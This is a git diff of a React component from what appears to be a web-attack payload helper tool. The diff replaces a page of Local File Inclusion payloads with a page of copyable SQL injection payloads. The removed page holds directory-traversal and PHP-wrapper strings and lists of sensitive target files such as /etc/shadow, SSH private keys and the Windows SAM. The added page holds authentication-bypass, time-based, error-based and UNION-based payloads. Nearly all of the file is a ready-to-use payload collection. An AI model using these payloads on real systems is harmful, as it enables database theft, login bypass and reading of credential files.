@@ -1,58 +1,80 @@
 import React from "react";
-import { Button, message, Typography, Divider } from "antd";
-import { CopyOutlined, LinkOutlined } from "@ant-design/icons";
+import { Typography, Divider } from "antd";
 import QueueAnim from "rc-queue-anim";
-import Clipboard from "react-clipboard.js";
 
 const { Title, Paragraph } = Typography;
 
 export default (props) => {
-  const successInfoReverseShell = () => {
-    message.success("Your LFI payload has been copied");
-  };
-  const successInfoEncodeURL = () => {
-    message.success("Your LFI payload URL encoded has been copied");
-  };
-  const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
-  const phpWrapperLfi = `/example1.php?page=expect://ls`;
-  const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
-  const linux = [
-    { title: "/etc/passwd" },
-    { title: "/etc/shadow" },
-    { title: "/etc/issue" },
-    { title: "/etc/group" },
-    { title: "/etc/hostname" },
-    { title: "/etc/ssh/ssh_config" },
-    { title: "/etc/ssh/sshd_config" },
-    { title: "/root/.ssh/id_rsa" },
-    { title: "/root/.ssh/authorized_keys" },
-    { title: "/home/user/.ssh/authorized_keys" },
-    { title: "/home/user/.ssh/id_rsa" },
+  const BasicSql = [
+    { title: "' or '" },
+    { title: "-- or # " },
+    { title: "' OR '1" },
+    { title: "' OR 1 -- -" },
+    { title: ' OR "" = "' },
+    { title: '" OR 1 = 1 -- -"' },
+    { title: "' OR '' = '" },
+    { title: "'='" },
+    { title: "'LIKE'" },
+    { title: "'=0--+" },
+    { title: "OR 1=1" },
+    { title: "' OR 'x'='x" },
+    { title: "' AND id IS NULL; --" },
+    { title: "'''''''''''''UNION SELECT '2" },
   ];
-  const apache = [
-    { title: "/etc/apache2/apache2.conf" },
-    { title: "/usr/local/etc/apache2/httpd.conf" },
-    { title: "/etc/httpd/conf/httpd.conf" },
-    { title: "Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log" },
-    { title: "Debian/Ubuntu -> /var/log/apache2/access.log" },
-    { title: "FreeBSD -> /var/log/httpd-access.log" },
-    { title: "/var/log/apache/access.log" },
-    { title: "/var/log/apache/error.log" },
-    { title: "/var/log/apache2/access.log" },
-    { title: "/var/log/apache/error.log" },
+  const TimeBased = [
+    { title: ",(select * from (select(sleep(10)))a)" },
+    { title: "%2c(select%20*%20from%20(select(sleep(10)))a)" },
+    { title: "';WAITFOR DELAY '0:0:30'--" },
   ];
-  const mysql = [
-    { title: "/var/lib/mysql/mysql/user.frm" },
-    { title: "/var/lib/mysql/mysql/user.MYD" },
-    { title: "/var/lib/mysql/mysql/user.MYI" },
+  const ErrorBased = [
+    { title: "OR 1=1" },
+    { title: "OR 1=1#" },
+    { title: "OR x=y#" },
+    { title: "OR 1=1-- " },
+    { title: "OR x=x-- " },
+    { title: "OR 3409=3409 AND ('pytW' LIKE 'pytW" },
+    { title: "HAVING 1=1" },
+    { title: "HAVING 1=1#" },
+    { title: "HAVING 1=0-- " },
+    { title: "AND 1=1-- " },
+    { title: "AND 1=1 AND '%'='" },
+    { title: "WHERE 1=1 AND 1=0--" },
+    { title: "%' AND 8310=8310 AND '%'='" },
   ];
-  const windows = [
-    { title: "/boot.ini" },
-    { title: "/autoexec.bat" },
-    { title: "/windows/system32/drivers/etc/hosts" },
-    { title: "/windows/repair/SAM" },
-    { title: "/windows/panther/unattended.xml" },
-    { title: "/windows/panther/unattend/unattended.xml" },
+  const AuthBased = [
+    { title: "' or ''-'" },
+    { title: "' or '' '" },
+    { title: "' or ''&'" },
+    { title: "' or ''^'" },
+    { title: "' or ''*'" },
+    { title: "or true--" },
+    { title: '" or true--' },
+    { title: "' or true--" },
+    { title: '") or true--' },
+    { title: "') or true--" },
+    { title: "admin') or ('1'='1'--" },
+    { title: "admin') or ('1'='1'#" },
+    { title: "admin') or ('1'='1'/" },
+  ];
+  const OrderUnion = [
+    { title: "1' ORDER BY 1--+" },
+    { title: "1' ORDER BY 2--+" },
+    { title: "1' ORDER BY 3--+" },
+    { title: "1' ORDER BY 1,2--+" },
+    { title: "1' ORDER BY 1,2,3--+" },
+    { title: "1' GROUP BY 1,2,--+" },
+    { title: "1' GROUP BY 1,2,3--+" },
+    { title: "' GROUP BY columnnames having 1=1 --" },
+    { title: "-1' UNION SELECT 1,2,3--+" },
+    { title: "' UNION SELECT sum(columnname ) from tablename --" },
+    { title: "-1 UNION SELECT 1 INTO @,@" },
+    { title: "-1 UNION SELECT 1 INTO @,@,@" },
+    { title: "1 AND (SELECT * FROM Users) = 1	" },
+    { title: "' AND MID(VERSION(),1,1) = '5';" },
+    {
+      title:
+        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
+    },
   ];
   return (
     <QueueAnim delay={300} duration={1500}>
@@ -71,31 +93,14 @@ export default (props) => {
       </Paragraph>
       <Divider dashed />
       <div style={{ padding: 10, marginTop: 15 }} key='a'>
-        <Title level={3}>Directory traversal</Title>
-        <Paragraph copyable ellipsis={true}>
-          {directoryTraversal}
-        </Paragraph>
-        <Clipboard component='a' data-clipboard-text={directoryTraversal}>
-          <Button
-            type='primary'
-            onClick={successInfoReverseShell}
-            style={{ marginBottom: 10, marginTop: 15 }}
-          >
-            <CopyOutlined /> Copy the payload
-          </Button>
-        </Clipboard>
-        <Clipboard
-          component='a'
-          data-clipboard-text={encodeURI(directoryTraversal)}
-        >
-          <Button
-            type='dashed'
-            onClick={successInfoEncodeURL}
-            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-          >
-            <LinkOutlined /> URL encoded
-          </Button>
-        </Clipboard>
+        <Title level={3}>Generic SQL Injection Payloads</Title>
+        {BasicSql.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
       </div>
       <Divider dashed />
       <div
@@ -105,29 +110,14 @@ export default (props) => {
           marginTop: 15,
         }}
       >
-        <Title level={3}>PHP Wrapper php://file</Title>
-        <Paragraph copyable ellipsis={true}>
-          {phpWrapperLfi}
-        </Paragraph>
-        <Clipboard component='a' data-clipboard-text={phpWrapperLfi}>
-          <Button
-            type='primary'
-            onClick={successInfoReverseShell}
-            style={{ marginBottom: 10, marginTop: 15 }}
-          >
-            <CopyOutlined />
-            Copy the payload
-          </Button>
-        </Clipboard>
-        <Clipboard component='a' data-clipboard-text={encodeURI(phpWrapperLfi)}>
-          <Button
-            type='dashed'
-            onClick={successInfoEncodeURL}
-            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-          >
-            <LinkOutlined /> URL encoded
-          </Button>
-        </Clipboard>
+        <Title level={3}>Time-Based</Title>
+        {TimeBased.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
       </div>
       <Divider dashed />
       <div
@@ -137,32 +127,14 @@ export default (props) => {
           marginTop: 15,
         }}
       >
-        <Title level={3}>PHP Wrapper php://filter</Title>
-        <Paragraph copyable ellipsis={true}>
-          {phpWrapperFilter}
-        </Paragraph>
-        <Clipboard component='a' data-clipboard-text={phpWrapperFilter}>
-          <Button
-            type='primary'
-            onClick={successInfoReverseShell}
-            style={{ marginBottom: 10, marginTop: 15 }}
-          >
-            <CopyOutlined />
-            Copy the payload
-          </Button>
-        </Clipboard>
-        <Clipboard
-          component='a'
-          data-clipboard-text={encodeURI(phpWrapperFilter)}
-        >
-          <Button
-            type='dashed'
-            onClick={successInfoEncodeURL}
-            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-          >
-            <LinkOutlined /> URL encoded
-          </Button>
-        </Clipboard>
+        <Title level={3}>Generic Error Based Payloads</Title>
+        {ErrorBased.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
       </div>
       <Divider dashed />
       <div
@@ -172,36 +144,8 @@ export default (props) => {
           marginTop: 15,
         }}
       >
-        <Title level={3}>Useful LFI files</Title>
-        <Title level={4}>Linux</Title>
-        {linux.map((k, i) => {
-          return (
-            <Paragraph key={i} copyable>
-              {k.title}
-            </Paragraph>
-          );
-        })}
-        <Divider dashed />
-        <Title level={4}>Apache</Title>
-        {apache.map((k, i) => {
-          return (
-            <Paragraph key={i} copyable>
-              {k.title}
-            </Paragraph>
-          );
-        })}
-        <Divider dashed />
-        <Title level={4}>MySQL</Title>
-        {mysql.map((k, i) => {
-          return (
-            <Paragraph key={i} copyable>
-              {k.title}
-            </Paragraph>
-          );
-        })}
-        <Divider dashed />
-        <Title level={4}>Windows</Title>
-        {windows.map((k, i) => {
+        <Title level={3}>Authentication Based Payloads</Title>
+        {AuthBased.map((k, i) => {
           return (
             <Paragraph key={i} copyable>
               {k.title}
@@ -210,6 +154,22 @@ export default (props) => {
         })}
       </div>
       <Divider dashed />
+      <div
+        key='e'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Title level={3}>Order by and UNION Based Payloads</Title>
+        {OrderUnion.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+      </div>
     </QueueAnim>
   );
 };
